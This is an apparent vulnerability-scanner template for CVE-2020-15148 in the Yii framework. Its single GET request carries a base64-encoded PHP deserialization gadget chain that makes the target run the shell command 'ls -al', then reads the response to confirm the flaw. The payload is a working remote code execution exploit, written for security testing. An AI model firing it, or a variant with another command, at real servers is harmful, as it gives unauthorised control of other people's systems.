id:
name: CVE-2020-15148
transport: http
tags:
  -  Yii-Framework
rules:
  req:
    request:
      cache: true
      method: GET
      path: /index.php?r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ==
      follow_redirects: true
    expression: response.status==500 &&
                response.body.bcontains(b'total') &&
                response.body.bcontains(b'An internal server error occurred.')

expression: req()
detail:
  vulnerability:
    proof:
      info: "存在CVE-2020-15148漏洞"